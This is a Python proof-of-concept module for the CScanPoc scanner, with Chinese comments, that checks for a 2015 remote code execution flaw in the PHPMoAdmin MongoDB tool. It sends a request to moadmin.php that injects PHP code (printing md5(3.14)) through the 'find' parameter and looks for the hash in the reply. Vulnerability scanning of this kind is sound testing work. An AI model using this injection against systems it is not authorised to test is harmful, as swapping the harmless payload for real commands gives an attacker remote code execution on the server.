# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PHPMoAdmin_0000'  # 平台漏洞编号，留空
    name = 'PHPMoAdmin 远程代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-03'  # 漏洞公布时间
    desc = '''
        phpMoAdmin是一款便捷的在线MongoDB管理工具，可用于创建、删除和修改数据库和索引，提供视图和数据搜索工具，提供数据库启动时间和内存的统计，支持JSON格式数据的导入导出的php应用。
        PHPMoAdmin 远程代码执行漏洞
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36251/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMoAdmin'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cf02e31e-eb35-4db9-952c-49101cb48f64'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            verify_url = arg + '/moadmin.php?db=xxx&action=listRows&collection=xxx&find=array2;'
            command = 'print(md5(3.14));exit'
            code, head, res, errcode, finalurl = hh.http(verify_url + command)
            if code == 200:
                if '4beed3b9c4a886067de0e3a094246f78' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
